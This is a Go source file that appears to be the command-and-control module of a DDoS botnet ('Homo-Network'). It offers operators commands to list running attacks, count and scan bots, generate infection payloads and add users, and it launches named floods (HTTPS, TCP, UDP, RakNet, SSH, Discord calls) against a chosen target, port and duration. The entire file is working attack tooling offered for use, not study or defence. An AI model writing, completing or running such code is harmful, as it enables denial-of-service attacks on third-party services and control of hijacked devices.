package cnc

import (
	"fmt"
	"homo/network/config"
	"homo/network/server"
	"net"
	"os"
	"strconv"
	"strings"
	"text/tabwriter"
	"time"

	"github.com/LsdDance/sencoding"
	"github.com/fatih/color"
	"github.com/iskaa02/qalam/gradient"
)

func RunningCnc(conn net.Conn) {
	if len(AttacksMap) < 1 {
		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("No active attacks\n"), conn)
		CommandManager(conn)
	}

	tab := strings.Builder{}

	w := tabwriter.NewWriter(&tab, 10, 10, 4, ' ', tabwriter.TabIndent)
	fmt.Fprintf(w, "\n%s\t%s\t%s\t%s\t%s\t%s\t%s\t\r", "  #", "Target", "Method", "Port", "Length", "Finish", "User")
	fmt.Fprintf(w, "\n%s\t%s\t%s\t%s\t%s\t%s\t%s\t\r", "-----", "------", "------", "----", "------", "------", "------")
	var x int
	for _, i := range AttacksMap {
		x++
		_login := sencoding.Decode(i.Login)
		login := strings.Split(_login, "|")

		fmt.Fprintf(w, "\n%d\t%s\t%s\t%s\t%s\t%s\t%s\t\r", x, strings.TrimPrefix(i.Target, "https://"), i.Method, i.Port, strconv.Itoa(i.Duration), strconv.Itoa(i.Finish), login[0])
		fmt.Fprintln(w)
	}

	w.Flush()
	Print(tab.String(), conn)
}

func BotsCnc(conn net.Conn, login string) {

	if login != config.GetConfig().Cnc.AdmLogin {
		Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
		CommandManager(conn)
	}

	count, list := server.GetBots()
	if count < 1 {
		Print(gradient.Rainbow().Apply("No bots connected\n"), conn)
	} else {
		Print(color.HiWhiteString("Bots count: "+gradient.Rainbow().Apply(strconv.Itoa(count))+"\n\r"), conn)
		Print(gradient.Rainbow().Apply(list+"\n\r"), conn)
	}

}

func ScannerCnc(conn net.Conn, login string) {
	if login != config.GetConfig().Cnc.AdmLogin {
		Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
		CommandManager(conn)
	} else {
		go server.Scan()
		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
	}
}

func AdduserCnc(conn net.Conn, login, command string) {

	if login != config.GetConfig().Cnc.AdmLogin {
		Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
		CommandManager(conn)
	} else {

		line := strings.ReplaceAll(string(command), "\n", "")
		line = strings.ReplaceAll(line, "\x00", "")
		args := strings.Split(line, " ")

		if len(args) < 2 {
			Print(gradient.Rainbow().Apply("adduser <LOGIN> <PASSWORD>\n\r"), conn)
			CommandManager(conn)
		}

		f, _ := os.OpenFile("./data/accounts.txt", os.O_RDWR|os.O_APPEND, 0600)
		f.Write([]byte(args[1] + ":" + args[2]))

		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
	}
}

func GeneratePayloadCnc(conn net.Conn, login string) {

	if login != config.GetConfig().Cnc.AdmLogin {
		Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
		CommandManager(conn)
	} else {
		payload := server.GeneratePayload()
		Print("\n"+payload+"\n\r", conn)
		CommandManager(conn)
	}
}

func RebootCnc(conn net.Conn, login string) {

	if login != config.GetConfig().Cnc.AdmLogin {
		Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
		CommandManager(conn)
	} else {
		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
		go server.Reboot()
	}
}

func HelpCnc(conn net.Conn, login string) {
	conn.Write([]byte("\n"))

	if login == config.GetConfig().Cnc.AdmLogin { // adm help

		conn.Write([]byte(color.HiWhiteString("\tAdmin Help Menu\n\r")))

		conn.Write([]byte(color.HiWhiteString("scanner\t\t| Scan your bots\n\r")))
		conn.Write([]byte(color.HiWhiteString("bots\t\t| Bots count\n\r")))
		conn.Write([]byte(color.HiWhiteString("adduser\t\t| Add user\n\r")))
		conn.Write([]byte(color.HiWhiteString("payload\t\t| Payload for scanners\n\r")))
		conn.Write([]byte(color.HiWhiteString("sreboot\t\t| Reboot\n\r")))
		conn.Write([]byte(color.HiWhiteString("methods\t\t| Botnet methods\n\r")))
		conn.Write([]byte(color.HiWhiteString("running\t\t| Active attacks\n\r")))

	} else {
		conn.Write([]byte(color.HiWhiteString("methods\t\t| Botnet methods\n\r")))
		conn.Write([]byte(color.HiWhiteString("running\t\t| Active attacks\n\r")))

	}

	conn.Write([]byte("\n"))
}

func MethodsCnc(conn net.Conn) {

	conn.Write([]byte("\n"))

	conn.Write([]byte(color.HiWhiteString("!https: Basic https flood\t\t| Type: L7\n\r")))
	conn.Write([]byte(color.HiWhiteString("!socket: Socket http flood\t\t| Type: L7\n\r")))
	conn.Write([]byte(color.HiWhiteString("!udpmix: Udp mix method\t\t\t| Type: L4\n\r")))
	conn.Write([]byte(color.HiWhiteString("!tcpmix: Tcp mix method\t\t\t| Type: L4\n\r")))
	conn.Write([]byte(color.HiWhiteString("!handshake: Handshake method\t\t| Type: L4\n\r")))
	conn.Write([]byte(color.HiWhiteString("!raknet: Raknet method\t\t\t| Type: L4\n\r")))
	conn.Write([]byte(color.HiWhiteString("!sshkill: Ssh method\t\t\t| Type: L4\n\r")))
	conn.Write([]byte(color.HiWhiteString("!discord: Udp method for discord calls\t| Type: L4\n\r")))

	conn.Write([]byte("\n"))

}

func cls(conn net.Conn) {
	Print("\x1B[2J\x1B[H", conn)
	CommandManager(conn)
}

func TcpmixCnc(line string, conn net.Conn, login string) {
	cmd := strings.Split(string(line), " ")

	if len(cmd) < 3 {
		CommandError("!tcpmix <TARGET> <PORT> <DURATION>\n\r", "!tcpmix 1.1.1.1 1093 60\n\r", conn)
	}
	if len(cmd) > 4 {
		CommandError("!tcpmix <TARGET> <PORT> <DURATION>\n\r", "!tcpmix 1.1.1.1 1093 60\n\r", conn)
	}

	go server.Tcpmix(cmd[1], cmd[3], cmd[2])
	Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + login + "*")
	fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + login))
	Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
	go NewAttack(sencoding.Encode(login+"|"+string(time.Now().Unix())), cmd[3], "tcpmix", cmd[1], cmd[2])
}

func SocketCnc(line string, conn net.Conn, login string) {
	cmd := strings.Split(string(line), " ")
	fmt.Println(cmd)

	if len(cmd) < 3 {
		CommandError("!socket <TARGET> <PORT> <DURATION>\n\r", "!socket http://example.com 443 60\n\r", conn)
	}
	if len(cmd) > 4 {
		CommandError("!socket <TARGET> <PORT> <DURATION>\n\r", "!socket http://example.com 443 60\n\r", conn)
	}

	if !strings.HasPrefix(cmd[1], "http://") {
		CommandError("!socket <TARGET> <PORT> <DURATION>\n\r", "!socket http://example.com 443 60\n\r", conn)
	}

	go server.Socket(cmd[1], cmd[3], cmd[2])
	Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + login + "*")
	fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + login))
	Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
	go NewAttack(sencoding.Encode(login+"|"+string(time.Now().Unix())), cmd[3], "socket", cmd[1], cmd[2])
}

func UdpmixCnc(conn net.Conn, login string, line string) {
	cmd := strings.Split(string(line), " ")
	fmt.Println(cmd)

	if len(cmd) < 3 {
		CommandError("!udpmix <TARGET> <PORT> <DURATION>\n\r", "!udpmix 1.1.1.1 1093 60\r\n", conn)
	}
	if len(cmd) > 4 {
		CommandError("!udpmix <TARGET> <PORT> <DURATION>\n\r", "!udpmix 1.1.1.1 1093 60\r\n", conn)
	}

	go server.Udpmix(cmd[1], cmd[3], cmd[2])
	Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + login + "*")
	fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + login))
	Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)

	go NewAttack(sencoding.Encode(login+"|"+string(time.Now().Unix())), cmd[3], "udpmix", cmd[1], cmd[2])
}

func HttpsCnc(conn net.Conn, login string, line string) {
	cmd := strings.Split(string(line), " ")
	fmt.Println(cmd)

	if len(cmd) < 3 {
		CommandError("!https <TARGET> <PORT> <DURATION>\n\r", "!https https://example.com 443 60\n\r", conn)
	}
	if len(cmd) > 4 {
		CommandError("!https <TARGET> <PORT> <DURATION>\n\r", "!https https://example.com 443 60\n\r", conn)
	}

	if !strings.HasPrefix(cmd[1], "https://") {
		CommandError("!https <TARGET> <PORT> <DURATION>\n\r", "!https https://example.com 443 60\n\r", conn)
	}

	go server.Https(cmd[1], cmd[3], cmd[2])
	Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + login + "*")
	fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + login))
	Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
	go NewAttack(sencoding.Encode(login+"|"+string(time.Now().Unix())), cmd[3], "https", cmd[1], cmd[2])

}

func RaknetCnc(conn net.Conn, login string, line string) {
	cmd := strings.Split(string(line), " ")
	fmt.Println(cmd)

	if len(cmd) < 3 {
		CommandError("!raknet <TARGET> <PORT> <DURATION>\n\r", "!raknet 1.1.1.1 1093 60\r\n", conn)
	}
	if len(cmd) > 4 {
		CommandError("!raknet <TARGET> <PORT> <DURATION>\n\r", "!raknet 1.1.1.1 1093 60\r\n", conn)
	}

	go server.Raknet(cmd[1], cmd[3], cmd[2])
	Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + login + "*")
	fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + login))
	Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)

	go NewAttack(sencoding.Encode(login+"|"+string(time.Now().Unix())), cmd[3], "raknet", cmd[1], cmd[2])

}

func HandshakeCnc(conn net.Conn, login string, line string) {
	cmd := strings.Split(string(line), " ")
	fmt.Println(cmd)

	if len(cmd) < 3 {
		CommandError("!handshake <TARGET> <PORT> <DURATION>\n\r", "!handshake 1.1.1.1 1093 60\n\r", conn)
	}
	if len(cmd) > 4 {
		CommandError("!handshake <TARGET> <PORT> <DURATION>\n\r", "!handshake 1.1.1.1 1093 60\n\r", conn)
	}

	go server.Handshake(cmd[1], cmd[3], cmd[2])
	Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + login + "*")
	fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + login))
	Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)

	go NewAttack(sencoding.Encode(login+"|"+string(time.Now().Unix())), cmd[3], "handshake", cmd[1], cmd[2])

}

func SshkillCnc(conn net.Conn, login string, line string) {
	cmd := strings.Split(string(line), " ")
	fmt.Println(cmd)

	if len(cmd) < 3 {
		CommandError("!sshkill <TARGET> <PORT> <DURATION>\n\r", "!sshkill 1.1.1.1 1093 60\r\n", conn)
	}
	if len(cmd) > 4 {
		CommandError("!sshkill <TARGET> <PORT> <DURATION>\n\r", "!sshkill 1.1.1.1 1093 60\r\n", conn)
	}

	go server.Sshkill(cmd[1], cmd[3], cmd[2])
	Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + login + "*")
	fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + login))
	Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)

	go NewAttack(sencoding.Encode(login+"|"+string(time.Now().Unix())), cmd[3], "sshkill", cmd[1], cmd[2])
}

func DiscordCnc(conn net.Conn, login string, line string) {
	cmd := strings.Split(string(line), " ")
	fmt.Println(cmd)

	if len(cmd) < 3 {
		CommandError("!discord <TARGET> <PORT> <DURATION>\n\r", "!discord 1.1.1.1 1093 60\r\n", conn)
	}
	if len(cmd) > 4 {
		CommandError("!discord <TARGET> <PORT> <DURATION>\n\r", "!discord 1.1.1.1 1093 60\r\n", conn)
	}

	go server.Discord(cmd[1], cmd[3], cmd[2])
	Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + login + "*")
	fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + login))
	Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)

	go NewAttack(sencoding.Encode(login+"|"+string(time.Now().Unix())), cmd[3], "discord", cmd[1], cmd[2])
}
